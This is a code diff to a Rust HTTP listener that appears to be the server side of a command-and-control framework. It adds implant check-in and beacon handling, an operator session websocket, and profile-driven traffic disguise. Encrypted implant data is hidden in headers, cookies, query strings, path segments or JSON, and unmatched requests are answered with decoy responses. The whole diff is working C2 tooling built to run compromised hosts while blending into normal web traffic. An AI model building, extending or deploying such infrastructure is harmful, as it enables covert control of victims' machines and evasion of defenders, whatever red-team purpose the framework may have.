@@ -12,6 +12,7 @@ use axum::http::StatusCode;
 use axum::response::IntoResponse;
 use axum::routing::{any, get, post};
 use axum::{Json, Router};
+use base64::{engine::general_purpose, Engine as _};
 use chacha20poly1305::aead::{Aead, KeyInit};
 use chacha20poly1305::{ChaCha20Poly1305, Nonce};
 use chrono::Utc;
@@ -38,6 +39,7 @@ use checkin_processor::{parse_plaintext_checkin, process_checkin, CheckinOptions
 pub struct HttpState {
     pub session_manager: Arc<SessionManager>,
     pub task_dispatcher: Arc<TaskDispatcher>,
+    pub event_bus: Arc<EventBus>,
     pub module_repository: Option<Arc<ModuleRepository>>,
     pub server_secret: Arc<StaticSecret>,
     pub server_pubkey: Arc<PublicKey>,
@@ -52,7 +54,11 @@ pub fn build_router(state: HttpState) -> Router {
         .route("/api/checkin", post(checkin_handler))
         .route("/api/beacon", post(beacon_handler))
         .route("/api/health", get(health_handler))
-        .route("/api/ws", get(ws_handler::ws_upgrade_handler));
+        .route("/api/ws", get(ws_handler::ws_upgrade_handler))
+        .route(
+            "/api/sessions/:session_id/ws",
+            get(ws_handler::operator_session_ws_handler),
+        );
 
     // If a profile is configured, add profile-driven routes
     if let Some(ref profile) = state.listener_profile {
@@ -111,6 +117,11 @@ async fn profile_handler(
     // Validate method
     let expected_method = profile.request_template.method.to_uppercase();
     if request.method().as_str().to_uppercase() != expected_method {
+        tracing::warn!(
+            "profile_handler: method mismatch: got {}, expected {}",
+            request.method(),
+            expected_method
+        );
         return decoy_handler().await.into_response();
     }
 
@@ -121,7 +132,10 @@ async fn profile_handler(
     // Extract body
     let body_bytes = match axum::body::to_bytes(request.into_body(), 1024 * 1024).await {
         Ok(b) => b,
-        Err(_) => return decoy_handler().await.into_response(),
+        Err(e) => {
+            tracing::warn!("profile_handler: failed to read request body: {e}");
+            return decoy_handler().await.into_response();
+        }
     };
 
     // Extract embedded data from request
@@ -132,18 +146,36 @@ async fn profile_handler(
         &req_uri,
     ) {
         Some(data) => data,
-        None => return decoy_handler().await.into_response(),
+        None => {
+            tracing::warn!(
+                "profile_handler: failed to extract embedded data from {} bytes",
+                body_bytes.len()
+            );
+            return decoy_handler().await.into_response();
+        }
     };
 
     // Apply reverse transform: decode → decrypt → decompress
     let plaintext = match transform_decode(&encoded_data, &profile.transform, &session_key) {
         Ok(pt) => pt,
-        Err(_) => return decoy_handler().await.into_response(),
+        Err(e) => {
+            tracing::warn!(
+                "profile_handler: transform decode failed for {} extracted bytes: {e}",
+                encoded_data.len()
+            );
+            return decoy_handler().await.into_response();
+        }
     };
 
     let parsed = match parse_plaintext_checkin(&plaintext) {
         Some(parsed) => parsed,
-        None => return decoy_handler().await.into_response(),
+        None => {
+            tracing::warn!(
+                "profile_handler: parsed plaintext check-in failed for {} bytes",
+                plaintext.len()
+            );
+            return decoy_handler().await.into_response();
+        }
     };
 
     let processed = match process_checkin(
@@ -158,7 +190,10 @@ async fn profile_handler(
     .await
     {
         Ok(processed) => processed,
-        Err(_) => return decoy_handler().await.into_response(),
+        Err(e) => {
+            tracing::warn!("profile_handler: check-in processing failed: {e}");
+            return decoy_handler().await.into_response();
+        }
     };
 
     // Simulate error rate
@@ -204,12 +239,12 @@ pub fn extract_embedded_data(
                 let body_str = std::str::from_utf8(body).ok()?;
                 let json: serde_json::Value = serde_json::from_str(body_str).ok()?;
                 let field_value = json.get(field_name)?.as_str()?;
-                return Some(field_value.as_bytes().to_vec());
+                return decode_embed_data(field_value.as_bytes(), ep.encoding.as_ref());
             }
             EmbedLocation::HeaderValue => {
                 if let Some(val) = headers.get(field_name) {
                     if let Ok(s) = val.to_str() {
-                        return Some(s.as_bytes().to_vec());
+                        return decode_embed_data(s.as_bytes(), ep.encoding.as_ref());
                     }
                 }
             }
@@ -221,7 +256,10 @@ pub fn extract_embedded_data(
                             let pair = pair.trim();
                             if let Some((name, value)) = pair.split_once('=') {
                                 if name.trim() == field_name {
-                                    return Some(value.trim().as_bytes().to_vec());
+                                    return decode_embed_data(
+                                        value.trim().as_bytes(),
+                                        ep.encoding.as_ref(),
+                                    );
                                 }
                             }
                         }
@@ -233,7 +271,7 @@ pub fn extract_embedded_data(
                     for pair in query.split('&') {
                         if let Some((key, value)) = pair.split_once('=') {
                             if key == field_name {
-                                return Some(value.as_bytes().to_vec());
+                                return decode_embed_data(value.as_bytes(), ep.encoding.as_ref());
                             }
                         }
                     }
@@ -246,7 +284,7 @@ pub fn extract_embedded_data(
                 let segments: Vec<&str> = path.split('/').filter(|s| !s.is_empty()).collect();
                 if let Ok(idx) = field_name.parse::<usize>() {
                     if let Some(seg) = segments.get(idx) {
-                        return Some(seg.as_bytes().to_vec());
+                        return decode_embed_data(seg.as_bytes(), ep.encoding.as_ref());
                     }
                 }
             }
@@ -271,11 +309,12 @@ pub fn extract_embedded_data(
 /// Format a response with embedded data per the profile's response template.
 pub fn format_profile_response(encoded_data: &[u8], template: &HttpTemplate) -> impl IntoResponse {
     let status = template.status_code.unwrap_or(200);
-    let data_str = String::from_utf8_lossy(encoded_data);
+    let embedded_data = encode_embed_data(encoded_data, template.data_embed_points.first());
+    let data_str = String::from_utf8_lossy(&embedded_data);
 
     let (body, default_content_type) = if let Some(ref body_template) = template.body_template {
         (
-            body_template.replace("{{data}}", &data_str).into_bytes(),
+            render_profile_template(body_template, &data_str).into_bytes(),
             "application/json",
         )
     } else {
@@ -284,7 +323,10 @@ pub fn format_profile_response(encoded_data: &[u8], template: &HttpTemplate) -> 
 
     let mut headers = Vec::new();
     for hdr in &template.headers {
-        headers.push((hdr.name.clone(), hdr.value.replace("{{data}}", &data_str)));
+        headers.push((
+            hdr.name.clone(),
+            render_profile_template(&hdr.value, &data_str),
+        ));
     }
 
     // Default content-type if not specified
@@ -323,7 +365,7 @@ fn format_profile_response_no_data(template: &HttpTemplate) -> impl IntoResponse
 
     // Return a minimal response without embedded data
     let body = if let Some(ref body_template) = template.body_template {
-        body_template.replace("{{data}}", "")
+        render_profile_template(body_template, "")
     } else {
         String::new()
     };
@@ -339,6 +381,56 @@ fn format_profile_response_no_data(template: &HttpTemplate) -> impl IntoResponse
 
 /// Binary wire format: [4-byte LE length][24-byte header][ciphertext][16-byte tag]
 /// Header = 12-byte implant pubkey prefix + 12-byte nonce
+fn render_profile_template(template: &str, data: &str) -> String {
+    let mut rendered = template
+        .replace("{{data}}", data)
+        .replace("{{timestamp}}", &Utc::now().timestamp().to_string());
+
+    while let Some(start) = rendered.find("{{random_hex(") {
+        let Some(end_rel) = rendered[start..].find(")}}") else {
+            break;
+        };
+        let end = start + end_rel + 3;
+        let len_text = &rendered[start + "{{random_hex(".len()..end - 3];
+        let Ok(len) = len_text.parse::<usize>() else {
+            break;
+        };
+        rendered.replace_range(start..end, &random_hex(len));
+    }
+
+    rendered
+}
+
+fn random_hex(len: usize) -> String {
+    const HEX: &[u8; 16] = b"0123456789abcdef";
+    let mut rng = rand::thread_rng();
+    let mut out = String::with_capacity(len);
+    for _ in 0..len {
+        let idx = rand::Rng::gen_range(&mut rng, 0..HEX.len());
+        out.push(HEX[idx] as char);
+    }
+    out
+}
+
+fn decode_embed_data(data: &[u8], encoding: Option<&EmbedEncoding>) -> Option<Vec<u8>> {
+    match encoding {
+        Some(EmbedEncoding::Base64) => general_purpose::STANDARD.decode(data).ok(),
+        Some(EmbedEncoding::Hex) => {
+            let s = std::str::from_utf8(data).ok()?;
+            hex::decode(s).ok()
+        }
+        Some(EmbedEncoding::Raw) | None => Some(data.to_vec()),
+    }
+}
+
+fn encode_embed_data(data: &[u8], embed_point: Option<&EmbedPoint>) -> Vec<u8> {
+    match embed_point.and_then(|ep| ep.encoding.as_ref()) {
+        Some(EmbedEncoding::Base64) => general_purpose::STANDARD.encode(data).into_bytes(),
+        Some(EmbedEncoding::Hex) => hex::encode(data).into_bytes(),
+        Some(EmbedEncoding::Raw) | None => data.to_vec(),
+    }
+}
+
 const WIRE_LEN_SIZE: usize = 4;
 const WIRE_IMPLANT_ID_SIZE: usize = 12;
 const WIRE_NONCE_SIZE: usize = 12;
@@ -792,6 +884,7 @@ impl ListenerManager {
         let http_state = HttpState {
             session_manager: Arc::clone(&self.session_manager),
             task_dispatcher: Arc::clone(&self.task_dispatcher),
+            event_bus: Arc::clone(&self.event_bus),
             module_repository: None,
             server_secret: Arc::new(secret),
             server_pubkey: Arc::new(pubkey),
